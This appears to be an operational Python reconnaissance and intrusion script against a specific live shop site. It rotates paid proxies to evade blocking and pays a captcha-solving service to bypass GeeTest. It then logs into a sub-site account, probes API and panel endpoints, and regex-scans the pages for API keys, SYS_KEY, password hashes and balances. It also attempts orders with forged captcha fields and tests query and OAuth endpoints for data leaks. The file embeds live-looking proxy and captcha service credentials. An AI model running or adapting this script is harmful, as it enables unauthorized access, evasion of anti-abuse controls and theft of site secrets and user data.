#!/usr/bin/env python3
"""Login as registered fenzhan p4764923 and dig panel + API surface."""
import json
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
OUT.mkdir(exist_ok=True)
LOG = OUT / "fenzhan.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "fz.jar")
KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
USER, PASS, QQ = "p4764923", "Test64923x", "123456789"
_px = None


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def fresh():
    global _px
    for area in ("440000", "0", "330000"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", "--max-time", "10",
                     f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px err {e}")
        time.sleep(0.8)
    return _px


def curl(url, post=None, mt=20, referer=None):
    global _px
    if not _px:
        fresh()
    for _ in range(5):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", f"Referer: {referer or BASE + '/'}",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh(); continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def solve(gt, challenge, page="/user/login.php"):
    task = {"type": "GeeTestTaskProxyless", "websiteURL": BASE + page,
            "gt": gt, "challenge": challenge}
    d = json.loads(subprocess.check_output(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", json.dumps({"clientKey": KEY, "task": task}),
         "https://api.2captcha.com/createTask"], text=True, timeout=35))
    if d.get("errorId"):
        raise RuntimeError(str(d))
    tid = d["taskId"]
    log(f"task {tid}")
    for _ in range(35):
        time.sleep(4)
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": KEY, "taskId": tid}),
             "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
        if d.get("errorId"):
            raise RuntimeError(str(d))
        if d.get("status") == "ready":
            return d["solution"]
    raise RuntimeError("timeout")


def login():
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/user/login.php", referer=BASE + "/user/login.php")
    for attempt in range(5):
        try:
            cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}",
                            referer=BASE + "/user/login.php")
            cap = json.loads(cap_b)
            sol = solve(cap["gt"], cap["challenge"])
        except Exception as e:
            log(f"captcha fail {e}"); time.sleep(2); continue
        for payload in [
            {"user": USER, "pass": PASS,
             "geetest_challenge": sol.get("challenge") or cap["challenge"],
             "geetest_validate": sol.get("validate", ""),
             "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan")},
            {"user": USER, "pwd": PASS,
             "geetest_challenge": sol.get("challenge") or cap["challenge"],
             "geetest_validate": sol.get("validate", ""),
             "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan")},
        ]:
            b, c = curl(BASE + "/user/ajax.php?act=login", payload, referer=BASE + "/user/login.php")
            log(f"login try {attempt}: {c} {(b or '')[:200]}")
            if b and ('"code":0' in b or '"code":1' in b or "成功" in b):
                hit("login_ok", f"{USER}:{PASS}", b)
                return True
            # one captcha per try
            break
    return False


def main():
    open(LOG, "w").write("")
    log(f"=== FENZHAN PIVOT {USER}:{PASS} zid=482 ===")
    fresh()

    # API without session first — fenzhan user/pass
    log("=== API with user/pass (no session) ===")
    for act, extra, method in [
        ("change", {"user": USER, "pass": PASS}, "POST"),
        ("orders", {"user": USER, "pass": PASS, "limit": "5", "tid": "4"}, "POST"),
        ("orders", {"user": USER, "pass": PASS, "limit": "5", "tid": "4", "sign": "1"}, "POST"),
        ("search", {"user": USER, "pass": PASS, "id": "26100"}, "POST"),
        ("goodslist", {"user": USER, "pass": PASS}, "POST"),
        ("goodslistbycid", {"user": USER, "pass": PASS, "cid": "4"}, "POST"),
        ("pay", {"user": USER, "pass": PASS, "tid": "4", "num": "1", "input1": "fzprobe"}, "POST"),
        ("tools", {}, "GET"),
    ]:
        if act == "change":
            url = f"{BASE}/%61pi.php?act=change&id=26100&zt=1"
            b, c = curl(url, {"user": USER, "pass": PASS})
        elif act == "tools":
            b, c = curl(f"{BASE}/%61pi.php?act=tools&key={urllib.parse.quote(PASS)}")
        else:
            b, c = curl(f"{BASE}/%61pi.php?act={act}", {**extra, **({"tid": "4"} if act == "orders" else {})})
        log(f"api {act}: {c} {(b or '')[:220]}")
        if b and "不正确" not in b and "NEEDAUTH" not in b and "请提供" not in b:
            if any(x in b for x in ('"code":0', '"code":1', "成功", '"tid"', "kami", "修改", "[")):
                hit("api_fenzhan", act, b)
        time.sleep(0.3)

    # also try pwd field name
    for passkey in ("pass", "pwd", "password"):
        b, c = curl(f"{BASE}/%61pi.php?act=orders", {"user": USER, passkey: PASS, "limit": "3", "tid": "4"})
        log(f"api orders {passkey}: {c} {(b or '')[:180]}")

    ok = login()
    if not ok:
        log("LOGIN FAILED — continue cookie-less probes")
    else:
        log("=== PANEL AFTER LOGIN ===")
        pages = [
            "/user/", "/user/index.php", "/user/shop.php", "/user/clist.php",
            "/user/recharge.php", "/user/workorder.php", "/user/uset.php",
            "/user/site.php", "/user/domain.php", "/user/message.php",
            "/user/record.php", "/user/list.php", "/user/kmlist.php",
            "/user/download.php", "/user/tixian.php", "/user/tuiguang.php",
            "/user/invite.php", "/?mod=panel", "/user/ajax.php?act=userinfo",
        ]
        for p in pages:
            b, c = curl(BASE + p, referer=BASE + "/user/")
            log(f"page {p}: {c} len={len(b or '')} {(b or '')[:120].replace(chr(10),' ')}")
            fname = "fz_" + p.strip("/").replace("/", "_").replace("?", "_").replace("=", "_") + ".html"
            (OUT / fname).write_text(b or "", errors="replace")
            # hunt secrets
            if b:
                for pat in (r'apikey["\']?\s*[:=]\s*["\']([^"\']+)', r'API[密钥key]+[:：\s]*([A-Za-z0-9]{8,})',
                            r'SYS_KEY', r'password_hash', r'money["\']?\s*[:=]\s*["\']?([0-9.]+)'):
                    for m in re.finditer(pat, b, re.I):
                        hit("panel_secret", f"{p}:{m.group(0)[:80]}", m.group(0)[:200])
            time.sleep(0.2)

        # authenticated ajax
        for act, post in [
            ("userinfo", {}), ("getuser", {}), ("getmoney", {}), ("getsite", {}),
            ("getconfig", {}), ("siteinfo", {}), ("orderlist", {"page": "1"}),
            ("recharge", {"money": "1", "type": "alipay"}),
            ("checklogin", {}),
        ]:
            b, c = curl(BASE + f"/user/ajax.php?act={act}", post or None, referer=BASE + "/user/")
            log(f"userajax {act}: {c} {(b or '')[:200]}")
            if b and "No Act" not in b and "登录" not in b:
                hit("user_ajax", act, b)
            b2, c2 = curl(BASE + f"/ajax.php?act={act}", post or None)
            log(f"rootajax {act}: {c2} {(b2 or '')[:160]}")
            time.sleep(0.2)

        # payrmb / create order as logged in
        home, _ = curl(BASE + "/")
        hs = None
        m = re.search(r"var hashsalt=(.+);", home or "")
        if m:
            try:
                hs = subprocess.run(
                    ["node", "-e", f"var hashsalt={m.group(1)}; console.log(hashsalt)"],
                    capture_output=True, text=True, timeout=5).stdout.strip()
            except Exception:
                pass
        csrf = None
        m = re.search(r'csrf_token\s*=\s*"([^"]+)"', home or "")
        if m:
            csrf = m.group(1)
        for tid in ("4", "118", "83"):
            pay = {
                "tid": tid, "num": "1", "inputvalue": "fz@" + USER,
                "hashsalt": hs or "x",
                "geetest_challenge": "1", "geetest_validate": "1", "geetest_seccode": "1|jordan",
            }
            if csrf:
                pay["csrf_token"] = csrf
            b, c = curl(BASE + "/ajax.php?act=pay", pay)
            log(f"pay tid={tid}: {c} {(b or '')[:200]}")
            if b and "trade_no" in b:
                hit("order_stocked", tid, b)
                try:
                    tn = json.loads(b).get("trade_no")
                except Exception:
                    tn = None
                if tn:
                    b2, c2 = curl(BASE + "/ajax.php?act=payrmb", {"orderid": tn})
                    log(f"payrmb {tn}: {c2} {(b2 or '')[:200]}")
                    # query by our QQ
                    b3, c3 = curl(BASE + "/ajax.php?act=query", {"type": "1", "qq": QQ, "page": "1"})
                    log(f"query qq: {c3} {(b3 or '')[:300]}")
                    if b3 and '"code":0' in b3 and "data" in b3:
                        hit("query_leak", QQ, b3)
                break

    # connect OAuth URL leak
    log("=== CONNECT / QUICKREG ===")
    for typ in ("qq", "wx", "alipay", "weibo"):
        b, c = curl(BASE + "/user/ajax.php?act=connect", {"type": typ, "back": "index"},
                    referer=BASE + "/user/login.php")
        log(f"connect {typ}: {c} {(b or '')[:250]}")
        if b and "url" in b:
            hit("oauth_url", typ, b)
        b2, c2 = curl(BASE + "/user/ajax.php?act=quickreg", {"type": typ, "submit": "do"},
                      referer=BASE + "/user/login.php")
        log(f"quickreg {typ}: {c2} {(b2 or '')[:250]}")

    # query with registered QQ even without login
    b, c = curl(BASE + "/ajax.php?act=query", {"type": "1", "qq": QQ, "page": "1"})
    log(f"query {QQ}: {c} {(b or '')[:300]}")
    b, c = curl(BASE + "/ajax.php?act=query", {"type": "0", "qq": USER, "page": "1"})
    log(f"query user: {c} {(b or '')[:300]}")

    log("=== FENZHAN PIVOT DONE ===")


if __name__ == "__main__":
    main()
